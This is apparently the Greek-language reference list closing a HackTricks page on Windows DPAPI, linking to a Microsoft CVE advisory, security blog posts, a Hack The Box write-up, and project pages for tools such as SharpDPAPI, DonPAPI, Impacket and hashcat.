- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Βελτίωση της ασφάλειας των cookies του Chrome στα Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Απλή εξαγωγή προαιρετικού entropy του DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Σημειώσεις έκδοσης του hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – Repository στο GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – Σελίδα project στο PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: Κατάχρηση AD ACL, cracking Argon2 του KeePassXC και αποκρυπτογράφηση DPAPI έως admin στο DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Χρήση και επιλογές](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
